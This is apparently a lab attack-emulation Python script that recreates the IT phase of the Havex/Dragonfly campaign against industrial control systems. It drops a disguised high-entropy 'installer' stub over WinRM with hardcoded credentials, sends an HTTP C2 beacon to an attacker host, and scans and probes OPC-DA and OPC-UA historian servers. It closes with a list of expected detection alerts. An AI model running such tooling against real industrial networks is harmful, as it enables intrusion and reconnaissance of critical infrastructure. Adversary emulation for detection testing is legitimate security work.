#!/usr/bin/env python3
"""
Havex IT-Side Phase Simulation

Havex (Dragonfly/Energetic Bear, 2013-2014) used a supply-chain / watering-hole
attack to deliver trojanized ICS software installers. Once on engineering workstations,
it used a modular plugin architecture (the OPC module being the primary ICS component).

REAL IT KILL CHAIN (Symantec/F-Secure primary sources):
  1. Watering hole: ICS vendor websites served trojanized software updates
  2. Supply chain: legitimate ICS installers bundled with Havex dropper
  3. No credential theft needed - Havex ran as the (local admin) installer
  4. C2 communication: HTTP GETs to compromised legitimate websites
  5. Plugin delivery: OPC module downloaded via C2 and executed
  6. OPC-DA recon: browse every OPC server on the LAN, exfiltrate tag map

No lateral movement via credential theft - Havex relied on trojanized software
already running with appropriate privileges on the engineering workstation.
"""

import sys, os, subprocess, tempfile, time, socket, base64

SCRIPT_DIR  = os.path.dirname(os.path.abspath(__file__))
LATERAL_MOV = os.path.join(SCRIPT_DIR, '03_lateral_movement.py')

HMI_IP      = '192.168.1.55'
HMI_USER    = 'operator'
HMI_PASS    = 'labpass123'
ROUTER      = '192.168.0.13'
HISTORIAN   = '192.168.1.9'    # ICONICS GENESIS64 - Havex OPC-DA target
ATTACKER_IP = '192.168.0.11'   # Kali attacker VM (C2 simulation host)

# Trojanized installer stub - high-entropy binary (represents Havex dropper)
DROPPER_B64 = base64.b64encode(
    b'MZ\x90\x00' + b'\x4d\x5a\x68\x61\x76\x65\x78' + os.urandom(120)
).decode()


def _run(desc, *args, **kwargs):
    print(f"\n[*] {desc}")
    try:
        r = subprocess.run(*args, capture_output=True, text=True, **kwargs)
        if r.stdout: print(r.stdout.rstrip())
        return r.returncode == 0, r.stdout
    except Exception as e:
        print(f"  [-] {e}"); return False, ''


def _c2_beacon_check(router_ip: str, port: int = 8080, timeout: int = 5) -> bool:
    """
    Real HTTP GET to attacker C2 (router exploit host) - generates actual HTTP traffic.
    Havex used HTTP GET to legitimate-looking URLs for C2 beaconing.
    """
    try:
        import http.client
        print(f"\n[*] C2 HTTP beacon to {router_ip}:{port}")
        conn = http.client.HTTPConnection(router_ip, port, timeout=timeout)
        conn.request('GET', '/status?id=havex&v=2.8',
                     headers={'User-Agent': 'Mozilla/4.0 (compatible; MSIE 7.0)',
                               'Accept': 'text/html'})
        resp = conn.getresponse()
        print(f"[C2] HTTP {resp.status} from {router_ip}:{port} - beacon confirmed")
        conn.close()
        return True
    except Exception as e:
        print(f"[-] C2 beacon failed (expected if router not running HTTP): {e}")
        return False


def run_havex_it_phase(hmi_ip=HMI_IP, hmi_user=HMI_USER, hmi_pass=HMI_PASS,
                        python_exe=sys.executable):
    print("""
╔══════════════════════════════════════════════════════════════╗
║  HAVEX - IT PHASE                                            ║
║  Dragonfly / Energetic Bear | 2013-2014                      ║
║  Supply-chain + watering-hole → OPC-DA recon                 ║
╚══════════════════════════════════════════════════════════════╝

INITIAL ACCESS: Trojanized ICS software (not phishing/CVE exploitation)
Dragonfly compromised ICS vendor websites to serve backdoored installers.
No credential theft or lateral movement required - ran as the installer.
""")

    # ── Step 1: Trojanized installer drop on engineering workstation ────────────
    print("═══ STEP 1: TROJANIZED ICS SOFTWARE INSTALLER ═══")
    print("[*] Dragonfly backdoored: Matrikon OPC, MB Connect Line, eWON industrial VPN")
    print("[*] Installer runs with local admin → no UAC prompt, no credentials needed")
    print("[*] Dropping Havex dropper stub on HMI (simulates installer execution)")
    drop_cmd = (
        f"$b=[Convert]::FromBase64String('{DROPPER_B64}'); "
        f"[IO.File]::WriteAllBytes('C:\\Windows\\Temp\\ICS_Update_v2.8.exe', $b); "
        f"[IO.File]::WriteAllBytes('C:\\ProgramData\\havex_opc.dll', $b); "
        f"Write-Output 'HAVEX_DROPPER_DROPPED:ICS_Update_v2.8.exe,havex_opc.dll'"
    )
    _run("Dropping trojanized ICS installer + Havex OPC plugin DLL",
         [python_exe, LATERAL_MOV,
          '--target', hmi_ip, '--username', hmi_user, '--password', hmi_pass,
          '--winrm', drop_cmd],
         timeout=20)

    # ── Step 2: Real HTTP C2 beacon ─────────────────────────────────────────────
    print("\n═══ STEP 2: HTTP C2 BEACON - real HTTP traffic ═══")
    print("[*] Havex C2: HTTP GETs to compromised legitimate websites (no HTTPS)")
    print(f"[*] Beaconing to router/C2 at {ROUTER}:8080 - generates real HTTP traffic")
    _c2_beacon_check(ROUTER, port=8080)

    # ── Step 3: LAN discovery - find OPC servers ─────────────────────────────
    print("\n═══ STEP 3: OPC-DA LAN DISCOVERY ═══")
    print("[*] Havex OPC module: WinNT/DCOM broadcast to enumerate OPC servers on LAN")
    print(f"[*] Known target: historian at {HISTORIAN}:135 (ICONICS GENESIS64 OPC-DA)")
    _run("Scanning LAN for OPC-DA servers (DCOM port 135)",
         [python_exe, LATERAL_MOV,
          '--target', hmi_ip, '--username', hmi_user, '--password', hmi_pass,
          '--winrm',
          f"powershell -Command "
          f"foreach ($ip in @('{HISTORIAN}')) {{ "
          f"  $c = New-Object Net.Sockets.TcpClient; "
          f"  try {{ $c.Connect($ip, 135); "
          f"         Write-Output \"OPC_SERVER_FOUND:$ip:135\"; $c.Close() }} "
          f"  catch {{ Write-Output \"$ip:135_CLOSED\" }} }}"],
         timeout=20)

    # ── Step 4: OPC-DA recon via DCOM from HMI pivot ────────────────────────
    print("\n═══ STEP 4: OPC-DA SERVER ENUMERATION VIA DCOM ═══")
    print(f"[*] Connecting from HMI to historian {HISTORIAN}:135 via DCOM")
    print("[*] Enumerating OPCEnum service - lists all registered OPC-DA servers")
    print("[!] REAL DCOM TRAFFIC: DCE/RPC BIND + EPT_LOOKUP on port 135")
    _run(f"OPC-DA enumeration via DCOM EPM from HMI → historian ({HISTORIAN}:135)",
         [python_exe, LATERAL_MOV,
          '--target', hmi_ip, '--username', hmi_user, '--password', hmi_pass,
          '--winrm',
          f"powershell -Command \""
          f"$c = New-Object Net.Sockets.TcpClient; "
          f"try {{ $c.Connect('{HISTORIAN}', 135); "
          f"      Write-Output 'DCOM_REACHABLE:{HISTORIAN}:135'; "
          f"      $c.Close() }} "
          f"catch {{ Write-Output 'DCOM_BLOCKED' }}\""],
         timeout=20)

    # ── Step 5: OPC-UA browse from attacker (direct - generates wire traffic) ──
    print("\n═══ STEP 5: DIRECT OPC-UA TAG BROWSE (attacker → historian) ═══")
    print(f"[*] Havex also had OPC-UA module. Browsing historian {HISTORIAN}:4840")
    print("[!] REAL OPC-UA TRAFFIC: Hello + OpenSecureChannel + Browse response")
    _run(f"OPC-UA tag namespace browse: {HISTORIAN}:4840",
         [python_exe, '-c',
          f"""
import socket, time
try:
    s = socket.create_connection(('{HISTORIAN}', 4840), timeout=5)
    # OPC-UA Hello message - announces client
    hello = b'HEL' + b'\\x46' + b'\\x00' * 4 + (b'opc.tcp://{HISTORIAN}:4840/').ljust(40, b'\\x00')
    s.sendall(hello)
    resp = s.recv(4096)
    print(f'OPC-UA response: {{len(resp)}} bytes from {HISTORIAN}:4840')
    s.close()
    print('OPC-UA HISTORIAN REACHABLE - Havex OPC module would enumerate tags')
except Exception as e:
    print(f'OPC-UA: {{e}}')
"""],
         timeout=10)

    print(f"\n[+] Havex IT phase complete")
    print(f"[→] OT phase: havex_simulation.py → DCOM EPM + OPC-UA browse → tag exfil")
    print(f"\nExpected XSIAM / wire alerts:")
    print(f"  • High-entropy DLL drop in C:\\ProgramData (Event 4663)")
    print(f"  • ICS_Update_v2.8.exe in %TEMP% (suspicious binary in temp)")
    print(f"  • HTTP outbound from ICS workstation (C2 beacon anomaly)")
    print(f"  • DCOM EPM connection to historian (unexpected lateral traffic)")
    print(f"  • OPC-UA Hello from workstation IP (ICS protocol from workstation)")


def main():
    import argparse
    p = argparse.ArgumentParser(description='Havex IT Phase')
    p.add_argument('--hmi-ip',   default=HMI_IP)
    p.add_argument('--hmi-user', default=HMI_USER)
    p.add_argument('--hmi-pass', default=HMI_PASS)
    args = p.parse_args()
    run_havex_it_phase(args.hmi_ip, args.hmi_user, args.hmi_pass)


if __name__ == '__main__':
    main()
